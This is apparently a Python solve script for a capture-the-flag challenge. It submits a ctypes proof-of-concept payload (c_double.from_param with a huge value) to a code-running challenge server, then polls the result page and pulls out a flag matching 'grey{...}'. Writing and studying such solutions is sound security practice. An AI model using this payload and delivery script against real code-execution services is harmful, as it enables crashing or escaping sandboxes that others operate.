import requests
import re
from time import sleep

BASE_URL = 'http://34.124.157.94:5000'
flag_format = 'grey{.*}'
sleep_time = 1
poc="""from ctypes import c_double\na = c_double.from_param(1e300)\nprint(a)"""

with requests.Session() as s:
    resp = s.post(BASE_URL, data={
        'code': poc,
    })

    token_url = resp.url
    print(f'URL for result: {token_url}\nSleeping for {sleep_time}s before requesting...')
    sleep(sleep_time)

    resp = s.get(token_url)

    # Find flags
    flags = re.findall(flag_format, resp.text)
    if len(flags) == 0:
        if ('In Queue' in resp.text):
            print('In queue, increase sleep time')
            exit(1)
        print('No flags found\nPlease check chall/poc')
        exit(1)
    print(f"Flag: {flags[0]}")